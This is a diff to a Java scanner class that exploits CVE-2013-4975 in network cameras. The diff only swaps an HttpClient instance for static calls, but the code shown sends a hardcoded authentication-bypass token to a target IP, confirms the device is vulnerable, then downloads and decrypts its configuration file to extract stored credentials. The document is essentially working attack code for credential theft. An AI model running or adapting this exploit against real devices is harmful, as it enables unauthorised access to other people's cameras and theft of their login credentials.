+++ src/main/java/scanner/cve/CVEScanner.java
@@ -19,21 +19,19 @@ public class CVEScanner {
     private static final String CVE_2013_4975 = "http://%s/system/deviceInfo?auth=YWRtaW46MTIzNDU=";
     private static final String CONFIG_FILE = "http://%s/System/configurationFile?auth=YWRtaW46MTIzNDU=";
 
-    private static final HttpClient client = new HttpClient();
-
     /**
      * Checks target address for vulnerability to CVE-2013-4975.
      *
      * @param ip target IP address.
      */
     public static void scanning(String ip) {
-        try (Response response = client.execute(String.format(CVE_2013_4975, ip))) {
+        try (Response response = HttpClient.execute(String.format(CVE_2013_4975, ip))) {
             ResponseBody responseBody = response.body();
             if (Objects.nonNull(responseBody)) {
                 String body = responseBody.string();
                 if (body.contains("firmwareVersion")) {
                     String credentials;
-                    try (Response configFile = client.execute(String.format(CONFIG_FILE, ip))) {
+                    try (Response configFile = HttpClient.execute(String.format(CONFIG_FILE, ip))) {
                         ResponseBody configFileBody = configFile.body();
                         credentials = (Objects.nonNull(configFileBody))
                                 ? " " + ConfigurationDecrypt.decrypt(configFileBody.byteStream())